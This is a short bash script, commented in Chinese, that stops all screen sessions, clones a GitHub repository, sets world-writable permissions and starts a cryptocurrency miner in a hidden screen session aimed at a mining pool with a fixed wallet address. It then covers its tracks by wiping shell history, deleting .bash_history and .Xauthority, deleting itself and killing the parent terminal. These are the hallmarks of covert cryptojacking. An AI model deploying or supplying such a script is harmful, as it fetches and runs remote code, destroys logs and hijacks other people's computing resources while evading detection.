#!/bin/bash

# 1. 清理旧进程
screen -ls | grep -o '[0-9]*\.[^[:space:]]*' | xargs -I {} screen -X -S {} quit 2>/dev/null

# 3. 准备工作目录
cd $HOME
if [ -d "btx" ]; then
    rm -rf btx1
    mv btx btx1
fi

# 4. 下载并处理权限
echo "正在下载程序..."
git clone https://github.com/xiaobintse/btx.git
if [ -d "$HOME/btx" ]; then
    chmod -R 777 $HOME/btx
    chmod +x $HOME/btx/btx
else
    echo "下载失败"
    exit 1
fi

# 5. 后台启动
echo "正在启动..."
screen -dmS btx bash -c "cd $HOME/btx && ./btx -o stratum+tcp://btx-hk.lproute.com:8660 -u btx1zspaa73ljgf4jj3mlesdgkjlyawnv357kuervsvuvp8f0fq786e3qj6mtzs.$(hostname) -p x -a btx"

# 6. 清理痕迹
history -c
history -w
rm -f $HOME/.Xauthority
rm -f $HOME/.bash_history

# 7. 脚本自删除
SCRIPT_PATH=$(readlink -f "$0")

echo "-------------------------------------------------------"
echo "部署完成！终端将在 3 秒后断开。"
echo "请稍后重新登录并输入 'screen -r btx' 查看运行情况。"
echo "-------------------------------------------------------"

sleep 3

# 自删除并退出
rm -f "$SCRIPT_PATH"
kill -9 $PPID
